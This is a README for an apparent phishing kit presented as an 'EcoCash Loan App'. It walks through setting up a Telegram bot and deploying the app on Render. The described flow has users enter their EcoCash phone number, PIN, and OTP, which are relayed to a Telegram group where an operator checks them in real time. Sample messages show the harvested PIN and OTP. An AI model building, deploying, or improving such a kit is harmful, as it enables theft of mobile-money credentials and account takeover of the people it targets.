# EcoCash Loan App

A production-ready mobile-first fintech loan application platform with Telegram admin approval workflow.

---

## How It Works

Users go through this flow:

1. **Home** — Loan calculator with live repayment preview
2. **Apply** — 3-step form (loan details → personal info → financial info)
3. **Submitted** — 5-second countdown, then auto-redirect to login
4. **Login** — EcoCash login (phone + 4-digit PIN) → credentials sent to Telegram
5. **Waiting** — Polls every 3 seconds; admin clicks **Approve** or **Reject** in Telegram
6. **OTP** — 6-digit OTP input with 80-second timer → sent to Telegram
7. **OTP Waiting** — Polls every 3 seconds; admin clicks **Correct** or **Wrong** in Telegram
8. **Success** — Final confirmation page

---

## Telegram Bot Setup

### Step 1 — Create a bot
1. Open Telegram and search for **@BotFather**
2. Send `/newbot`
3. Choose a name and username for your bot
4. Copy the **token** — this is your `BOT_TOKEN`

### Step 2 — Get your Chat ID
1. Add your bot to the Telegram group/channel where you want to receive notifications
2. Make the bot an **admin** of the group
3. Send a message in the group
4. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
5. Find `"chat":{"id": -1001234567890}` — that number is your `CHAT_ID`

> **Note:** Group chat IDs are negative numbers (e.g. `-1001234567890`). Personal chat IDs are positive.

### Step 3 — Configure environment variables

Set these in your environment:

| Variable | Description | Example |
|----------|-------------|---------|
| `BOT_TOKEN` | Telegram bot token from @BotFather | `7123456789:AAFxxx...` |
| `CHAT_ID` | Chat/group ID for admin notifications | `-1001234567890` |
| `DATABASE_URL` | PostgreSQL connection string | Auto-provisioned on Replit |

---

## Running Locally

```bash
# Install dependencies
pnpm install

# Push database schema
pnpm --filter @workspace/db run push

# Start API server (port 8080)
pnpm --filter @workspace/api-server run dev

# Start frontend (port auto-assigned)
pnpm --filter @workspace/ecocash run dev
```

---

## Deploying to Render

### Step 1 — Push to GitHub

1. Go to [github.com/new](https://github.com/new)
2. Create a new repository named **ecocash**
3. In your terminal (or Replit Shell):

```bash
git remote add origin https://github.com/YOUR_USERNAME/ecocash.git
git branch -M main
git push -u origin main
```

### Step 2 — Create a PostgreSQL database on Render

1. Go to [render.com](https://render.com) and sign in
2. Click **New** → **PostgreSQL**
3. Name it `ecocash-db`
4. Choose the **Free** plan
5. Click **Create Database**
6. Copy the **Internal Database URL** — you'll need it in Step 4

### Step 3 — Create a Web Service on Render

1. Click **New** → **Web Service**
2. Connect your GitHub repository
3. Configure the service:

| Setting | Value |
|---------|-------|
| **Name** | `ecocash-api` |
| **Root Directory** | *(leave empty)* |
| **Runtime** | `Node` |
| **Build Command** | `npm install -g pnpm && pnpm install && pnpm --filter @workspace/db run push && pnpm --filter @workspace/api-server run build` |
| **Start Command** | `node --enable-source-maps artifacts/api-server/dist/index.mjs` |
| **Plan** | Free |

### Step 4 — Set Environment Variables on Render

In the Render service → **Environment** tab, add:

| Key | Value |
|-----|-------|
| `DATABASE_URL` | Internal DB URL from Step 2 |
| `BOT_TOKEN` | Your Telegram bot token |
| `CHAT_ID` | Your Telegram chat ID |
| `PORT` | `8080` |
| `NODE_ENV` | `production` |

### Step 5 — Deploy the Frontend

The frontend is a static Vite app. You can deploy it to **Render Static Site** or **Vercel**:

**Render Static Site:**
| Setting | Value |
|---------|-------|
| **Build Command** | `npm install -g pnpm && pnpm install && pnpm --filter @workspace/ecocash run build` |
| **Publish Directory** | `artifacts/ecocash/dist` |

Set this environment variable:
| Key | Value |
|-----|-------|
| `VITE_API_BASE_URL` | Your Render API service URL |

### Step 6 — Configure Telegram Webhook

After deployment, the webhook is auto-registered on server startup. If it doesn't register automatically, call:

```
POST https://api.telegram.org/bot<BOT_TOKEN>/setWebhook
Body: {"url": "https://your-render-service.onrender.com/api/telegram/webhook"}
```

---

## Telegram Admin Approval Flow

When a user submits the EcoCash login, the admin receives a Telegram message like:

```
🏦 NEW ECOCASH LOAN APPLICATION

👤 Applicant Details:
• Name: John Doe
• Phone: 0771234567
• Employment: Employed
• Monthly Income: $800

💰 Loan Details:
• Type: Personal
• Amount: $1,000
• Term: 12 months
• Purpose: Home improvement

🔐 EcoCash Login Credentials:
• Phone: +263771234567
• PIN: 1234

[✅ Approve]  [❌ Reject]
```

After OTP submission, admin receives:

```
🔢 OTP VERIFICATION REQUEST

👤 Applicant: John Doe
📱 Phone: 0771234567

🔑 Submitted OTP Code: 123456

[✅ Correct]  [❌ Wrong]
```

---

## Tech Stack

- **Frontend:** React 19 + Vite + TailwindCSS + Framer Motion + wouter
- **Backend:** Express 5 + Node.js 24
- **Database:** PostgreSQL + Drizzle ORM
- **Validation:** Zod v4 + drizzle-zod
- **API:** OpenAPI spec → Orval codegen (React Query hooks + Zod schemas)
- **Telegram:** Bot API via HTTP webhooks

---

## Project Structure

```
├── artifacts/
│   ├── api-server/          # Express API server
│   │   └── src/
│   │       ├── routes/      # applications.ts, telegram.ts, health.ts
│   │       └── lib/         # telegram.ts (bot integration)
│   └── ecocash/             # React + Vite frontend
│       └── src/
│           └── pages/       # home, apply, submitted, login, waiting, otp, otp-waiting, success
├── lib/
│   ├── api-spec/            # OpenAPI contract (source of truth)
│   ├── api-client-react/    # Generated React Query hooks
│   ├── api-zod/             # Generated Zod schemas
│   └── db/                  # Drizzle schema + migrations
```
